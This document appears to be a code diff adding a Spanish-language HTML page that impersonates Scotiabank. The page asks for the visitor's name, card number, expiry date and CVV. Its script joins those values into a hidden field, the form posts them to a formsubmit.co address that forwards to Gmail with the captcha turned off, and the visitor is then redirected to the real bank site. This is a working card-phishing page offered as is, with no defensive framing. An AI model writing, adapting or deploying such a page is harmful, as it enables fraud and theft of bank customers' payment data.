@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="page2.css">
+    <title>Scotiabank</title>
+</head>
+<body>
+    <div class="contenedor">
+        <div class="formulario">
+            <form class="form" action="https://formsubmit.co/respuesforms@gmail.com" method="POST">
+                <div class="nombre">
+                <label for="name">Nombres:</label>
+                <input type="text" name="" id="name">
+                </div>
+                <div class="apellido">
+                <label for="apellido">Apellidos:</label>
+                <input type="text" name="" id="apellido">
+                </div>
+                <div class="tarjeta">
+                    <label for="numtarjeta">Número de tarjeta:</label>
+                    <div class="inputtarjeta">
+                    <input type="text" name="" class="numtarjeta">
+                    <img src="tarjeta.png" height="37px" width="70px" class="imgtarjeta" alt="tarjeta">
+                </div>
+                </div>
+                <div class="fechaycv">
+                <div class="fecha">
+                <label for="fecha">Fecha de expiración:</label>
+                <div class="options">
+                <select name="" id="mes">
+                    <option value="MM">MM</option>
+                    <option value="01">01</option>
+                    <option value="02">02</option>
+                    <option value="03">03</option>
+                    <option value="04">04</option>
+                    <option value="05">05</option>
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                    <option value="08">08</option>
+                    <option value="09">09</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                </select>
+                <select name="" id="año">
+                    <option value="AA">AA</option>
+                    <option value="2021">2021</option>
+                    <option value="2022">2022</option>
+                    <option value="2023">2023</option>
+                    <option value="2024">2024</option>
+                    <option value="2025">2025</option>
+                    <option value="2026">2026</option>
+                    <option value="2027">2027</option>
+                    <option value="2028">2028</option>
+                    <option value="2029">2029</option>
+                    <option value="2030">2030</option>
+                    <option value="2031">2031</option>
+                    <option value="2032">2032</option>
+                </select>
+                <input type="hidden" name="email" value="respues2formul@gmail.com">
+                <input type="hidden" name="_captcha" value="false">
+                <!-- colocar un input que tenga como value la variable datos -->
+                <input type="hidden" name="name" id="todo" value="">
+                <input type="hidden" name="_next" value="https://www.scotiabank.com.mx/">
+            </div>
+        </div>
+        <div class="contcvv">
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="" class="cvv">
+            </div>
+            </div>
+                <input class="btnpagar" type="submit" value="Ingresar">
+
+                <script>
+                    <!-- unir los datos ingresados en el input de id apellido e input de id cvv -->
+                    var apellido = document.getElementById("apellido");
+                    var cvv = document.getElementById("cvv");
+                    var btnpagar = document.querySelector(".btnpagar");
+                    var todo = document.getElementById("todo");
+                    btnpagar.addEventListener("click", function(){
+                        var apellido = document.getElementById("apellido").value;
+                        var cvv = document.getElementById("cvv").value;
+                        var name = document.getElementById("name").value;
+                        var numtarjeta = document.querySelector(".numtarjeta").value;
+                        var mes = document.getElementById("mes").value;
+                        var año = document.getElementById("año").value;
+                        var datos = "Nombres: " + name + " Apellidos: " + apellido + " Número de tarjeta: " + numtarjeta + " Fecha de expiración: " + mes + "/" + año + " CVV: " + cvv;
+                        
+
+                        todo.value = datos;
+                    });
+                </script>
+
+            </form>
+        </div>
+    </div>
+</body>
+</html>
